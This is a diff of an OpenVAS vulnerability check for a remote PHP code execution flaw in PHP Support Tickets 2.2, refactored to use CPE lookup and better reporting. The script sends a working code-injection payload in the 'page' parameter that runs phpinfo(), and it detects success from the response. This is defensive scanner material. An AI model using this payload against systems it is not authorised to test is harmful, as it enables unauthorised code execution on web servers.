@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_php_support_tickets_49567.nasl 5840 2017-04-03 12:02:24Z cfi $
+# $Id: gb_php_support_tickets_49567.nasl 10321 2018-06-26 06:01:09Z cfischer $
 #
 # PHP Support Tickets 'page' Parameter Remote PHP Code Execution Vulnerability
 #
@@ -24,81 +24,79 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+CPE = "cpe:/a:triangle_solutions:php_support_tickets";
+
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.103256");
- script_version("$Revision: 5840 $");
- script_tag(name:"last_modification", value:"$Date: 2017-04-03 14:02:24 +0200 (Mon, 03 Apr 2017) $");
- script_tag(name:"creation_date", value:"2011-09-14 13:31:57 +0200 (Wed, 14 Sep 2011)");
- script_bugtraq_id(49567);
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_name("PHP Support Tickets 'page' Parameter Remote PHP Code Execution Vulnerability");
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49567");
- script_xref(name : "URL" , value : "http://www.phpsupporttickets.com/index.php");
- script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
- script_dependencies("gb_php_support_tickets_detect.nasl");
- script_require_ports("Services/www", 80);
- script_mandatory_keys("php_support_tickets/installed");
+  script_oid("1.3.6.1.4.1.25623.1.0.103256");
+  script_version("$Revision: 10321 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-26 08:01:09 +0200 (Tue, 26 Jun 2018) $");
+  script_tag(name:"creation_date", value:"2011-09-14 13:31:57 +0200 (Wed, 14 Sep 2011)");
+  script_bugtraq_id(49567);
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_name("PHP Support Tickets 'page' Parameter Remote PHP Code Execution Vulnerability");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
+  script_dependencies("gb_php_support_tickets_detect.nasl");
+  script_mandatory_keys("php_support_tickets/installed");
 
- script_tag(name : "summary" , value : "PHP Support Tickets is prone to a vulnerability that lets remote
- attackers execute arbitrary code because the application fails to
- sanitize user-supplied input.");
- script_tag(name : "impact" , value : "Attackers can exploit this issue to execute arbitrary PHP code within
- the context of the affected webserver process.");
- script_tag(name : "affected" , value : "PHP Support Tickets 2.2 is vulnerable; other versions may also
- be affected.");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49567");
+  script_xref(name:"URL", value:"http://www.phpsupporttickets.com/index.php");
 
- exit(0);
+  script_tag(name:"summary", value:"PHP Support Tickets is prone to a vulnerability that lets remote
+  attackers execute arbitrary code because the application fails to
+  sanitize user-supplied input.");
+
+  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary PHP code within
+  the context of the affected webserver process.");
+
+  script_tag(name:"affected", value:"PHP Support Tickets 2.2 is vulnerable. Other versions may also
+  be affected.");
+
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"NoneAvailable");
+
+  exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("version_func.inc");
 include("host_details.inc");
-   
-port = get_http_port(default:80);
-if(!dir = get_dir_from_kb(port:port,app:"php_support_tickets"))exit(0);;
+
+if(!port = get_app_port(cpe:CPE)) exit(0);
+if(!dir  = get_app_location(port:port, cpe:CPE)) exit(0);
 
 url = string(dir, "/index.php");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 if( buf == NULL ) exit(0);
 
-session_id = eregmatch(pattern:"Set-Cookie: PHPSESSID=([^;]+)",string:buf);
-if(isnull(session_id[1]))exit(0);
+session_id = eregmatch(pattern:"Set-Cookie: PHPSESSID=([^;]+)", string:buf);
+if(isnull(session_id[1])) exit(0);
 sess = session_id[1];
 
-url = string(dir, "/index.php?page=xek()%3Bfunction+PHPST_PAGENAME_XEK(){phpinfo()%3B}"); 
+url = string(dir, "/index.php?page=xek()%3Bfunction+PHPST_PAGENAME_XEK(){phpinfo()%3B}");
 
-soc = open_sock_tcp(port);
-if(!soc)exit(0);
-
-host = http_host_name( port:port );
-
-req = string("GET /index.php?page=xek()%3Bfunction+PHPST_PAGENAME_XEK(){phpinfo()%3B} HTTP/1.1\r\n",
-	     "Host: ",host,"\r\n",
-	     "User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
+host = http_host_name(port:port);
+req = string("GET ", url, " HTTP/1.1\r\n",
+	     "Host: ", host, "\r\n",
+	     "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
 	     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
 	     "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
 	     "Accept-Encoding: gzip, deflate\r\n",
 	     "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
 	     "DNT: 1\r\n",
 	     "Connection: keep-alive\r\n",
-	     "Cookie: PHPSESSID=",sess,"\r\n",
+	     "Cookie: PHPSESSID=", sess, "\r\n",
 	     "\r\n");
-send(socket:soc, data:req);
-buf = recv(socket:soc, length:16384);
-close(soc);
+buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
 if("<title>phpinfo()" >< buf && "php.ini" >< buf && "PHP API" >< buf) {
-
-  security_message(port:port);
+  report = report_vuln_url(port:port, url:url);
+  security_message(port:port, data:report);
   exit(0);
+}
 
-}  
-     
 exit(99);
